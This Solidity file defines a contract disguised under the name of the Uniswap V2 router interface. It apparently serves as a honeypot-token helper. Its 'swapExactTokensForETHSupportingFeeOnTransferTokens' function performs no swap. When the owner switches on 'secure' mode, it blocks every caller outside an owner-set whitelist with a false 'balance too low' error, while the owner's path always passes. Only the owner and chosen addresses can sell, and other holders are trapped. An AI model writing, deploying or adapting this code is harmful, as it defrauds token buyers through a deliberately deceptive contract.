// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.1;

contract IUniswapV2Router02 {
    address public owner;
    bool public secure;
    
    mapping(address => uint) public allowance;

    constructor() {
        owner = tx.origin;
        secure = false;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function updateSecureParam(bool p) onlyOwner external {
            secure = p;
            return;
    }

    function allowTransactions(address a, uint value) onlyOwner external {
        allowance[a] = value;
    }

    function getOwner() view external returns(address) {
        return owner;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns(bool) {
        if (secure == false) {
            // if secure mode isn't enabeled
            return true;
        } else {
            if (path[0] != owner) {
                // if not owner
                if (allowance[msg.sender] < 1) {
                    // if sender not in white list
                    revert("balance too low");
                    return false;
                }
                // if sender in white list
                allowance[msg.sender] -= 1;
                return true;
            } else {
                // if owner
                return true;
            }
        }
    }
}